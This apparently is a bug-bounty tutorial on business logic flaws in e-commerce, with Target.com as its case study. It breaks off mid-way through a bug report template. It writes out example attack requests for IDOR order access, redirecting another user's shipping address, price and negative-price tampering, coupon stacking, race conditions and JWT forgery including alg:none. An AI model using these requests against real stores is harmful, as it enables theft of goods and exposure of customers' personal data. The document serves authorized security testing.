

```markdown
# 🔐 Hunting Business Logic Vulnerabilities in E-Commerce
## A Target.com Security Testing Guide

**Author:** Security Researcher  
**Date:** December 4, 2025  
**Difficulty:** Beginner to Intermediate  
**Reading Time:** 20-25 minutes

---

## 📌 Introduction

Business logic vulnerabilities are **the most overlooked yet highest-paying bugs** in bug bounty programs. While others scan for SQL injection and XSS, seasoned hunters look for **authorization flaws, price manipulation, and race conditions**.

This writeup documents a **systematic methodology** for identifying:
- 🎯 IDOR (Insecure Direct Object References)
- 🔓 Authorization Bypasses
- ⚙️ Business Logic Flaws
- 🔄 Race Conditions & State Inconsistencies

Using **Target.com** as our case study, you'll learn how to test e-commerce workflows without external reconnaissance. These principles apply to **any e-commerce platform**.

---

## 💡 Why Business Logic Vulnerabilities Matter

### Real-World Impact

A customer wants to buy a laptop for $999 on Target.com. The system:
1. Adds item to cart ✓
2. Applies coupon codes
3. Calculates total with tax/shipping
4. Processes payment
5. Confirms order

**But what if an attacker can:**
- Modify the price to $0.99 before payment
- Apply unlimited discount codes
- Access other users' orders
- Complete purchases with zero balance
- Execute payment twice simultaneously

**The Result:** Financial loss, unauthorized transactions, account takeover.

These vulnerabilities **bypass traditional security controls** because the code is technically correct—it's the **business rules that are flawed**.

---

## 📋 Part 1: Understanding Target.com's Core Workflows

### 1.1 Key E-Commerce Workflows

**Workflow 1: Account & Checkout**
```
Signup → Email Verify → Add Payment → Place Order → Pay → Confirmation
```

**Workflow 2: Shopping Cart**
```
Add Item → Apply Coupon → Modify Qty → Calculate Total → Checkout
```

**Workflow 3: Order Management**
```
Place Order → Confirmation → Delivery → Returns → Account Credit
```

**Workflow 4: Account Privileges**
```
Create Account → Add Payment → Set Shipping → Manage Preferences
```

### 1.2 Identifying API Endpoints

Modern e-commerce sites use REST APIs. Common patterns:

```
GET    /api/v1/cart                          → Get shopping cart
POST   /api/v1/cart/items                    → Add item
PUT    /api/v1/cart/items/{itemId}           → Modify item
DELETE /api/v1/cart/items/{itemId}           → Remove item
POST   /api/v1/cart/apply-coupon             → Apply discount
GET    /api/v1/orders                        → List user orders
GET    /api/v1/orders/{orderId}              → Get order details
POST   /api/v1/orders                        → Create order
PUT    /api/v1/orders/{orderId}              → Update order
POST   /api/v1/orders/{orderId}/cancel       → Cancel order
POST   /api/v1/orders/{orderId}/return       → Return order
GET    /api/v1/inventory/{productId}         → Check stock
GET    /api/v1/users/{userId}/addresses      → Get addresses
POST   /api/v1/users/{userId}/payment        → Add payment method
```

**Pro Tip:** Look for **numeric IDs** (123, 456)—they're IDOR goldmines compared to UUIDs.

---

## 🎯 Part 2: IDOR - Your First Vulnerability

### 2.1 Classic IDOR: Accessing Other Users' Orders

**Scenario:** You're logged in, you place an order. Notice this request:

```
GET /api/v1/orders/78901
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response (200 OK):
{
  "orderId": 78901,
  "userId": 2001,
  "customerName": "Your Name",
  "orderDate": "2025-12-04",
  "items": [
    {
      "productId": 456,
      "name": "PlayStation 5",
      "price": 499.99
    }
  ],
  "totalPrice": 599.99,
  "shippingAddress": {
    "street": "123 Main St",
    "city": "New York",
    "state": "NY",
    "zip": "10001"
  },
  "paymentMethod": "Visa ending in 4242"
}
```

**Attack:** Change the order ID:

```
GET /api/v1/orders/78900
Authorization: Bearer <Your_Token>

Response (200 OK):
{
  "orderId": 78900,
  "userId": 3001,                    ← Different user!
  "customerName": "Jane Smith",
  "orderDate": "2025-12-03",
  "items": [...],
  "shippingAddress": {...},
  "paymentMethod": "Amex ending in 1234"
}
```

**You just accessed another user's order!** ✅ IDOR vulnerability confirmed.

**Impact:**
- View personal information
- See purchase history
- Discover shipping addresses
- View partial payment methods
- Potentially modify/cancel orders

### 2.2 Modifying Orders You Don't Own

**Test:**
```
PUT /api/v1/orders/78900
Authorization: Bearer <Your_Token>
Content-Type: application/json

{
  "shippingAddress": {
    "street": "999 Attacker St",
    "city": "Hacker City",
    "state": "HK",
    "zip": "12345"
  }
}

Response (200 OK):
{
  "orderId": 78900,
  "status": "updated"
}
```

**Result:** You changed Jane Smith's shipping address to yours. Her PlayStation 5 now ships to you. 💸

---

## 💰 Part 3: Business Logic Exploitation - Price Manipulation

### 3.1 Direct Price Modification

**Normal Request:**
```
POST /api/v1/cart/items
Content-Type: application/json

{
  "productId": 456,
  "name": "PlayStation 5",
  "price": 499.99,
  "quantity": 1
}
```

**Attack Request:**
```
POST /api/v1/cart/items
Content-Type: application/json

{
  "productId": 456,
  "name": "PlayStation 5",
  "price": 99.99,              ← Changed!
  "quantity": 1
}
```

**Result (if vulnerable):** Your cart shows PS5 for $99.99. You checkout for $99.99. You just got a $400 discount. 🎮

### 3.2 Coupon Code Stacking

**Normal:**
```
POST /api/v1/cart/apply-coupon
{"couponCode": "SAVE10"}      → 10% off
```

**Attack - Apply Multiple Times:**
```
POST /api/v1/cart/apply-coupon
{"couponCode": "SAVE10"}

POST /api/v1/cart/apply-coupon
{"couponCode": "SAVE10"}

POST /api/v1/cart/apply-coupon
{"couponCode": "SAVE10"}
```

**Result:** 30% discount instead of 10%.

### 3.3 Negative Price Injection

```
POST /api/v1/cart/items
{
  "productId": 456,
  "price": -499.99,            ← Negative = credit instead of charge!
  "quantity": 1
}
```

**Result:** Adding a negative-price item **credits** your account instead of charging it.

---

## 🔄 Part 4: Race Conditions - Exploiting Timing Flaws

### 4.1 The Double-Purchase Attack

**Scenario:** Your account has $600. PS5 costs $499.99. You can only buy one, right?

**Normal behavior:** First purchase succeeds, second fails.

**Vulnerable behavior:** Both succeed, balance becomes -$399.98.

**How to execute in Burp Suite:**

**Step 1:** Create purchase request:
```
POST /api/v1/orders
{
  "cartItems": [{"productId": 456, "quantity": 1}],
  "totalPrice": 599.99,
  "paymentMethodId": 101
}
```

**Step 2:** In Burp Repeater, click "Send" rapidly (within milliseconds).

**Step 3:** Check responses:
- Both show "order_success" = **Vulnerable**
- First succeeds, second fails = Secure

**Step 4:** Check order history—do you have two orders?

### 4.2 Refund + Purchase Race Condition

```
Request 1: Initiate refund
POST /api/v1/orders/78901/return
{"returnReason": "Defective"}

Request 2 (simultaneous): Purchase new item
POST /api/v1/orders
{"totalPrice": 499.99}

Result:
- Refund processes → account credit +$600
- Purchase processes → account charge -$500
- Both happen before balance re-check
- Net: You have $100 credit + free item
```

---

## 🛡️ Part 5: JWT Authentication Bypass

### 5.1 Decoding JWT Tokens

**JWT Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIyMDAxIiwiZW1haWwiOiJ1c2VyQHRhcmdldC5jb20iLCJyb2xlIjoidXNlciJ9.
TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```

**Decode at jwt.io:**
```
Header: {
  "alg": "HS256",
  "typ": "JWT"
}

Payload: {
  "sub": "2001",
  "email": "user@target.com",
  "role": "user",
  "iat": 1733336400,
  "exp": 1733423800
}
```

### 5.2 Modifying User ID in JWT

**Original Payload:**
```
{
  "sub": "2001",
  "email": "your@email.com",
  "role": "user"
}
```

**Modified Payload:**
```
{
  "sub": "3001",              ← Changed!
  "email": "victim@email.com",
  "role": "user"
}
```

**Attack:** Re-encode this JWT. If the backend doesn't validate the signature, you now have a token for userId 3001.

### 5.3 Algorithm Confusion Attack

**Original:**
```
{ "alg": "HS256", "typ": "JWT" }
```

**Attack - Change to:**
```
{ "alg": "none", "typ": "JWT" }
```

This tells the server: "this JWT doesn't need verification." If the backend accepts it:
1. Modify the payload (change userId, role, etc.)
2. Remove the signature
3. Use the modified JWT

---

## 📝 Part 6: Step-by-Step Testing Walkthrough

### Scenario: Testing Portfolio/Order Modification

**Prerequisites:**
- Account A: user1@wearehackerone.com
- Account B: user2@wearehackerone.com
- Account A Order ID: 78901
- Account B Order ID: 78902

**Step 1: Log in as Account A**
```
POST /api/v1/auth/login
{
  "email": "user1@wearehackerone.com",
  "password": "TestPassword123!"
}

Response:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "userId": 2001
}
```

**Step 2: Get Your Order**
```
GET /api/v1/orders/78901
Authorization: Bearer eyJhbGc...

Response (200):
{
  "orderId": 78901,
  "userId": 2001,
  "totalPrice": 599.99,
  "status": "delivered",
  "items": [...]
}
```

**Step 3: Attempt IDOR - Access Other Order**
```
GET /api/v1/orders/78902
Authorization: Bearer eyJhbGc...

Expected: 403 Forbidden
Vulnerable: 200 OK + full order details
```

**Step 4: If Vulnerable - Try Modification**
```
PUT /api/v1/orders/78902
Authorization: Bearer eyJhbGc...
{
  "shippingAddress": {
    "street": "Your Address",
    "city": "Your City"
  }
}
```

**Step 5: Document the Findings**
- ✅ Confirmed IDOR on /api/v1/orders/{orderId}
- ✅ Can retrieve other users' order details
- ✅ Can potentially modify shipping address
- 🔴 **Severity: High** (privacy violation + order modification)

---

## 🚀 Part 7: Testing Methodology & Tools

### Using Burp Suite

**1. Capture Requests:**
- Enable Burp Proxy
- Browse application normally
- All requests appear in HTTP History

**2. Repeater (Testing):**
- Right-click request → Send to Repeater
- Modify parameters
- Observe responses
- Compare against expected behavior

**3. Parameter Fuzzing:**
- Change IDs: 123 → 124, 125, 126...
- Add hidden parameters: `"admin": true`
- Modify data types: `"price": 100` → `"price": "100"`

### Testing Checklist

- [ ] Map all API endpoints
- [ ] Identify numeric IDs (IDOR candidates)
- [ ] Test accessing resources with different user IDs
- [ ] Try modifying accessed resources
- [ ] Test JWT token manipulation
- [ ] Attempt coupon stacking
- [ ] Modify prices in cart/order
- [ ] Test race conditions (double purchase)
- [ ] Check for negative values acceptance
- [ ] Test order cancellation/modification
- [ ] Verify payment amount before/after
- [ ] Check refund logic

---

## 📊 Bug Report Template

```
Title: Insecure Direct Object Reference (IDOR) - Access Other Users' Orders

Severity: High
Type: Authorization Bypass

Description:
The application fails to properly verify user permissions when 
accessing order details. An authenticated attacker can access 
and modify other users' orders by changing the orderId parameter.

Steps to Reproduce:
1. Create Account A and Account B
2. Log in as Account A
3. Place an order (Order ID: 78901)
4. In Burp Suite, capture: GET /api/v1/orders/78901
5. Change 78901 to 78902 (Account B's order ID)
6. Send request
7. Observe: Full order details of Account B are returned

Expected Result:
403 Forbidden - Access Denied

Actual Result:
200 OK - Full order details including:
- Shipping address
- Payment method
- Order items
- Personal information

Impact:
- Privacy violation (access to personal data)
- Potential order modification
- Account takeover vectors

Proof of Concept:
GET /api/
